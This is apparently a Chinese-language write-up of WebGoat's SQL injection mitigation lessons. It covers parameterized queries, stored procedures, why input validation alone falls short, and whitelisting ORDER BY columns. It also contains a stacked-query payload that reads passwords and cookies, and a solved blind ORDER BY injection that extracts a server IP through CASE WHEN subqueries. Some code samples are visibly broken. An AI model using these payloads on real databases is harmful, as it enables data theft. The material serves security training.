---
id: 
title: SQL Injection (mitigation)
---
<!-- muse start -->
Web Goat 的 SQL 注入缓解以及后端代码示例，参数化查询、输入验证、ORDER BY 特性。
即使使用参数化查询，ORDER BY 子句根据定义也可以包含表达式。
<!-- muse end -->

## 不可变查询

这是防御 SQL 注入的最佳方式。它们要么不包含可能被解释的数据，要么将数据视为绑定到列且不被解释的单一实体。

### 静态查询

```java
String query = "SELECT * FROM products";

String query = "SELECT * FROM users WHERE user = '" + session.getAttribute("UserID") + "'";
```

### 参数化查询

```java
String query = "SELECT * FROM users WHERE last_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
```

## 存储过程

仅当存储过程不生成动态 SQL 时有效

### 安全存储过程（Microsoft SQL Server）

```sql
CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
AS
SELECT city, COUNT(*)
FROM customers
WHERE country LIKE @Country GROUP BY city

EXEC ListCustomers ‘USA’
```

### 可注入存储过程（Microsoft SQL Server）
<!--  -->
示例似乎不完全
<!--  -->
```sql
CREATE PROCEDURE getUser(@lastName nvarchar(25))
AS
declare @sql nvarchar(255)
set @sql = 'SELECT * FROM users WHERE
            lastname = + @LastName + '

exec sp_executesql @sql
```


## 参数化查询 - Java 代码片段

```java
public static bool isUsernameValid(string username) {
    RegEx r = new Regex("^[A-Za-z0-9]{16}$");
    return r.isMatch(username);
}

// java.sql.Connection conn is set elsewhere for brevity.
PreparedStatement ps = null;
RecordSet rs = null;
try {
    pUserName = request.getParameter("UserName");
    if ( isUsernameValid (pUsername) ) {
        ps = conn.prepareStatement("SELECT * FROM user_table WHERE username = ? ");
        ps.setString(1, pUsername);
        rs = ps.execute();
        if ( rs.next() ) {
            // do the work of making the user record active in some way
        }
    } else {
        // handle invalid input
    }
}
catch (...) { // handle all exceptions ... }
```

### 重要提示

正确使用预编译语句；参数应通过 `ps.set..()` 方法设置，请勿使用以下语句：

```java
String insertStatement = "INSERT INTO USERS (id, name, email) VALUES (%s, %s, %s)".format("1", "webgoat", "webgoat@owasp.org");
PreparedStatement statement = conn.prepareStatement(insertStatement);
statement.executeUpdate();
```

（为示例需要，我们假设传递的值基于用户输入）。上述示例并非预编译语句的正确用法，应使用：

```java
PreparedStatement statement = conn.prepareStatement("INSERT INTO USERS (id, name, email) VALUES (?, ?, ?)");
statement.setString(1, "1");
statement.setString(2, "webgoat");
statement.setString(3, "webgoat@owasp.org");
statement.executeUpdate();
```

## 参数化查询 - Java 代码示例

```java
public static String loadAccount() {
  // Parser returns only valid string data
  String accountID = getParser().getStringParameter(ACCT_ID, "");
  String data = null;
  String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
  try (Connection connection = dataSource.getConnection()) {
       PreparedStatement statement = connection.prepareStatement(query)) {
     statement.setString(1, accountID);
     ResultSet results = statement.executeQuery();
     if (results != null && results.first()) {
       results.last(); // Only one record should be returned for this query
       if (results.getRow() <= 2) {
         data = processAccount(results);
       } else {
         // Handle the error - Database integrity issue
       }
     } else {
       // Handle the error - no records found }
     }
  } catch (SQLException sqle) {
    // Log and handle the SQL Exception }
  }
  return data;
}
```

## 尝试一下！编写安全代码1

您可以在下方看到一些代码，但代码不完整。请完善代码，使其不再易受 SQL 注入攻击！请使用您之前学过的类和方法。

该代码需要根据用户的姓名和邮箱地址检索用户状态。姓名和邮箱均为字符串格式。

```java
Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);

PreparedStatement statement = conn.prepareStatement("SELECT status FROM users WHERE name=? AND mail=?");

statement.setString(1, name);

statement.setString(2, mail);
```
连接数据库，构建参数化查询，将数据与占位符关联

## 尝试一下！编写安全代码2

现在该编写您自己的代码了！您的任务是使用 JDBC 连接数据库并从中请求数据。

**要求**：
- 连接数据库
- 对数据库执行一个能够抵御 SQL 注入攻击的查询
- 您的查询需要至少包含一个字符串参数

**开始前的一些提示**：
对于连接数据库，您可以简单地假设常量 `DBURL`、`DBUSER` 和 `DBPW` 已给定。
您的查询内容无关紧要，只要 SQL 有效且满足要求即可。
您编写的所有代码都将插入到一个名为 "TestClass" 的 Java 类的 main 方法中，该类已为您导入 `java.sql.*`。

**没有足够的创意来构思自己的查询？** 何不尝试从一个名为 `users` 的虚构数据库表中检索具有特定姓名的用户数据。

例如；以下代码可以编译无误（但当然不符合完成本课的要求）。

```java
try {
    Connection conn = null;
    System.out.println(conn);   //should output 'null'
} catch (Exception e) {
    System.out.println("Oops. Something went wrong!");
}
```

运用您的知识，在下面的编辑器窗口中从头开始编写一些有效的代码！

```java
String username = "foo";
String query = "SELECT password FROM user WHERE username=?";

try(Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW)){
    PreparedStatement statement = conn.prepareStatement(query);
    statement.setString(1, username);
    ResultSet results = statement.executeQuery();
} catch(SQLException sqle) {
    System.out.println("Oops. Something went wrong!");
}
```

## 参数化查询 - .NET
```java
public static bool isUsernameValid(string username) {
	RegEx r = new Regex("^[A-Za-z0-9]{16}$");
	Return r.isMatch(username);
}

// SqlConnection conn is set and opened elsewhere for brevity.
try {
	string selectString = "SELECT * FROM user_table WHERE username = @userID";
	SqlCommand cmd = new SqlCommand( selectString, conn );
	if ( isUsernameValid( uid ) ) {
		cmd.Parameters.Add( "@userID", SqlDbType.VarChar, 16 ).Value = uid;
		SqlDataReader myReader = cmd.ExecuteReader();
		if ( myReader ) {
			// make the user record active in some way.
			myReader.Close();
		}
	} else { // handle invalid input }
}
catch (Exception e) { // Handle all exceptions... }
```

## 仅靠输入验证是不够的！！

您需要同时使用参数化查询和验证用户输入。在 StackOverflow 上您会看到许多回答声称输入验证就足够了。然而，当您发现验证被绕过时，您的应用程序就可能存在 SQL 注入漏洞。

关于为什么输入验证不足的精彩解读可参阅：https://twitter.com/marcan42/status/1238004834806067200?s=21

让我们重复之前的一个练习：开发人员通过过滤修复了可能的 SQL 注入，您能发现这种方法中的漏洞吗？(SQL Injection (advanced) - 3)

在[此处](http://localhost:3000/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/2)阅读本课目标。

之前挑战的注入语句
```
'; SELECT userid,user_name,password,cookie FROM user_system_data --
```

:x: 此处返回404，似乎运行错误

## 10 仅靠输入验证是不够的！！

因此，上次验证查询是否不包含任何空格的尝试失败了，开发团队进一步转向仅执行输入验证，您能找出这次的问题所在吗？
在此处阅读本课目标。

:x: 此处返回404，似乎运行错误


## ORDER BY 子句

**问题：** 预编译语句是否总能防止 SQL 注入？  
**答案：** 不能

让我们看以下语句：

```java
"SELECT * FROM users ORDER BY " + sortColumName + ";"
```

查看 SQL 语法规范，定义如下：

```sql
SELECT ...
FROM tableList
[WHERE Expression]
[ORDER BY orderExpression [, ...]]

orderExpression:
{ columnNr | columnAlias | selectExpression }
    [ASC | DESC]

selectExpression:
{ Expression | COUNT(*) | {
    COUNT | MIN | MAX | SUM | AVG | SOME | EVERY |
    VAR_POP | VAR_SAMP | STDDEV_POP | STDDEV_SAMP
} ([ALL | DISTINCT][2]] Expression) } [[AS] label]
```
（基于 HSQLDB）

这意味着排序表达式可以是选择表达式，而选择表达式也可以是函数。例如，通过 CASE 语句我们可以向数据库提出一些问题，如：

```sql
SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)
```

因此我们可以在 WHEN(...) 部分替换任何布尔操作。无论是否使用预编译语句，该语句都会正常工作，因为 ORDER BY 子句根据定义可以包含表达式。

### 缓解措施

如果需要在 Web 应用程序中提供排序列，应实施白名单来验证 ORDER BY 语句的值。应始终将其限制为诸如"姓氏"或"名字"之类的选项。


## 12 本次任务

尝试通过 ORDER BY 字段执行 SQL 注入。请尝试查找 `webgoat-prd` 服务器的 IP 地址，完整猜测 IP 地址可能耗时过长，因此我们提供最后部分：xxx.130.219.202

点击排序时，请求行为
```http
GET http://localhost:3000/WebGoat/SqlInjectionMitigations/servers?column=hostname HTTP/1.1
```
响应按照选择的标签进行排序，此处截取一个
```json
{
  "id" : "1",
  "hostname" : "webgoat-dev",
  "ip" : "192.168.4.0",
  "mac" : "AA:BB:11:22:CC:DD",
  "status" : "online",
  "description" : "Development server"
}
...
```
`column`参数值的上下文为 `ORDER BY`

基于上一篇文档构建查询模板，使用响应json的字段名，探测是否有效
```sql
(CASE WHEN (1=1) THEN id ELSE ip END)
(CASE WHEN (1=2) THEN id ELSE ip END)
```
有效，基于模板构建向量，查看排序差异。（若输入不存在的列名无论条件直报错）
```sql
(CASE WHEN ((SELECT ip FROM servers WHERE hostname='webgoat-prd')='xxx.130.219.202') THEN id ELSE ip END)
```

载荷 `104` 得到差异排序
提交 `104.130.219.202` 通过挑战

示例解决方案使用字符串字串来逐个字符确认，
并在 `WHEN` 后使用 `IS NOT NULL` 处理 NULL 值
```sql
(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substr(ip,1,1) = '1') IS NOT NULL THEN hostname ELSE id END)
```